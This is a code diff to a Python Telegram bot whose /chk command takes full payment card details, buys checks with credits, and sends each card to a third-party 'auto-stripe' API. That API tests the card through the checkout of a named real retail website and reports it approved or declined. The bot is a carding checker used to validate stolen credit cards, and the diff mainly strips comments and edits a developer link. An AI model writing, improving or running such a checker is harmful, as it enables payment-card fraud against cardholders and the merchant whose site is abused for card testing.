@@ -693,10 +693,9 @@ import aiohttp
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
-from telegram.ext import ContextTypes
+from telegram.ext import ContextTypes, Application, CommandHandler
 
 # In a real bot, these would connect to a database or a persistent store.
-# We're using simple dictionaries for this example.
 user_cooldowns = {}
 user_data_store = {}
 authorized_users = {12345678: True} # Example user ID
@@ -731,11 +730,9 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-# In a real-world scenario, this would be an async function or a thread-safe call.
-# For this example, we'll treat it as a synchronous blocking function to demonstrate `to_thread`.
+# This is a synchronous, potentially blocking function.
 def get_bin_details_sync(bin_number: str) -> dict:
     """Simulates a synchronous, potentially blocking BIN lookup."""
-    # This is a dummy implementation. A real one would make a sync HTTP request.
     time.sleep(1) # Simulate network delay
     return {
         "scheme": "Visa",
@@ -744,16 +741,13 @@ def get_bin_details_sync(bin_number: str) -> dict:
     }
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box."""
-
+    """Handles the /chk command."""
     user = update.effective_user
     user_id = user.id
 
-    # Enforce cooldown
     if not await enforce_cooldown(user_id, update):
         return
 
-    # Load user data
     user_data = await get_user(user_id)
     if user_data.get('credits', 0) <= 0:
         return await update.effective_message.reply_text(
@@ -761,7 +755,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN_V2
         )
 
-    # Parse card input
     raw = None
     if context.args:
         raw = context.args[0]
@@ -782,19 +775,16 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.MARKDOWN_V2
         )
 
-    # Normalize year to 2 digits
     if len(parts[2]) == 4:
         parts[2] = parts[2][-2:]
     cc_normalized = "|".join(parts)
 
-    # Deduct credit before starting the process
     if not await consume_credit(user_id):
         return await update.effective_message.reply_text(
             "❌ No credits left\\.",
             parse_mode=ParseMode.MARKDOWN_V2
         )
 
-    # Processing box
     processing_text = (
         "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
         f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
@@ -810,8 +800,8 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
 
     try:
-        # BIN lookup - run in a separate thread to prevent blocking
         bin_number = parts[0][:6]
+        # Use asyncio.to_thread to prevent blocking the event loop
         bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
         
         if bin_details is None:
@@ -820,7 +810,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         issuer = (bin_details.get("type") or "N/A").upper()
         country_name = (bin_details.get("country_name") or "N/A").upper()
         
-        # Darkboy API call - aiohttp is already async and non-blocking
         api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=25) as resp:
@@ -832,7 +821,6 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_response = data.get("response") or "N/A"
         time_taken = round(time.time() - start_time, 2)
 
-        # Final headers and text with MarkdownV2 for formatting
         if api_status.lower() == "approved":
             header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
         elif api_status.lower() == "declined":
@@ -853,11 +841,10 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
             "――――――――――――――――\n"
             f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
-            "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
+            "✘ Developer   ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
             f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
             "――――――――――――――――"
         )
-
         await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
 
     except Exception as e:
